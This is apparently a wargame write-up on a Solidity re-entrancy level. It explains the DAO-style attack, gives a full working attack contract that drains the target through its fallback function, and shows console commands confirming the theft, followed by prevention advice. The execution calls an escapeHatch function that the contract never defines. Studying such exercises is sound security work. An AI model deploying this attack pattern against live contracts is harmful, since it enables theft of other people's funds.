## Exercise 10: Re-entrancy

Re-entrancy is a vulnerability that allows a malicious party to re-execute part of a function multiple times before the function has completed. It was a re-entrancy attack that famously drained the Ethereum DAO in 2016 of 3.6M ether. 

The sequence for the re-entrancy attack is: 1) send some ether to the contract (withdraw func requires that the user has some balance), 2) withdraw ether from the contract, 3) During withdrawal, execute the withdraw function again N times before the user balance has been updated in contract's mapping.

So, we will first create an instance of the vulnerable `Reenter.sol` contract. That contract has a function `donate()` that receives ether and allows the function caller to have a balance in the contract's `balances` mapping. So we will send some ether to the contract's `donate()` function to get our hack contract into `Reenter.sol`'s mapping. Then our hack contract is able to call `withdraw` legitimately as long as the requested amount is less than the value in `mappings`.

At this point we can create a malicious loop such that when `Reenter.sol` sends funds to our hack contract it triggers the fallback function which includes inside it an additional call to `withdraw()`. This works because the transfer of ether happens before the state variables are updated in `Reenter.sol`, and it is the transfer of ether that triggers the fallback function that makes an additional call to `withdraw`. The hack contract can repeatedly receive ether without the value in `balances` ever decrementing. In this way, the total balance of the contract can be drained.

### ReenterHack.sol
This contract hacks `Reenter.sol` using the re-entrancy described above

```javascript

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import './Reentrance.sol';


contract ReentranceHack{

    address payable owner;
    address payable contractAddress;
    uint amount;
    Reentrance reentrance;
   
    constructor(address payable _contractAddress) public {
        // set vulnerable contract deployment address 
        // on deployment
        owner = msg.sender;
        contractAddress = _contractAddress;
        // create instance of vulnerable contract
        reentrance = Reentrance(contractAddress);

    }


    function attack() external payable {
        // receive ether from msg.sender
        // pass the ether to the vulnerable contract
        // then we have a balance in their mapping
        // then call withdraw func
        amount = msg.value;
        reentrance.donate{value: amount}(address(this));
        withdraw(); 
    }


    function withdraw() private {
        // withdraw checks that the vulnerablecontract has a +ve
        // balance. If so, we withdraw some ether. While our
        // deposit amount is smaller than the contract balance we
        // can withdraw <= deposit amount. When the contract balance
        // is less than our deposit amount we just withdraw whatever 
        // remains

        uint withdrawAmount;

        if (address(reentrance).balance > 0){
        
            if (address(reentrance).balance < amount){
                withdrawAmount = address(reentrance).balance;
            }
            
            else{
                withdrawAmount = amount;
            }

            reentrance.withdraw(withdrawAmount);
        }
    }



    receive() external payable{
    // this is our fallback function. When ether is received,
    // withdraw() is executed        
        withdraw();

    }



}

```

## Execution

```bash
>>> hacker = accounts.load('main')
>>> contract = Reentrance.at('DEPLOYED ADDRESS')
>>> hack = ReentranceHack('VULNERABLE CONTRACT DEPLOYED ADDRESS', {'from':hacker})
>>> hack.attack({'from':hacker, 'value': 0.2e18}) # value in wei
>>> hack.balance() # confirm hack contract balance has increased
  >>> 201000000000000000
>>> contract.balance # confirm original contract balance is 0
  >>> 0
>>> hack.escapeHatch({'from':hacker}) # return funds from contract to eoa address
```

## Prevention

Re-entrancy can be guarded against by taking care over the order of execution within a function. Calling external functions should be the final step in a multi-step function, coming after any state changes. If the values in the balances mapping were updated prior to the transfer of ether the re-entrancy would more difficult. More security can be gained by using a mutex. This is often a simple boolean that flips its value for each transfer and has to be manually flipped back (i.e. a "lock" variable that must be 'false' for the transfer to execute). Using the OpenZepelin re-entrancy guard is a very effective blocker to re-entrancy hacks. Finally, using `.transfer()` instead of `.call()` or `.send()`to move ether out of a contract is safer because it throws exceptions and interrupts the function execution when the recipient fails to accept incoming ether and limits the forwarded gas, limiting re-entrancy.


### Links

[Protecting against re-entrancy](https://medium.com/coinmonks/protect-your-solidity-smart-contracts-from-reentrancy-attacks-9972c3af7c21)

[Analysis of the dao attack](https://hackingdistributed.com/2016/06/18/analysis-of-the-dao-exploit/)

[reentrancy walkthrough](https://medium.com/coinmonks/ethernaut-lvl-10-re-entrancy-walkthrough-how-to-abuse-execution-ordering-and-reproduce-the-dao-7ec88b912c14)

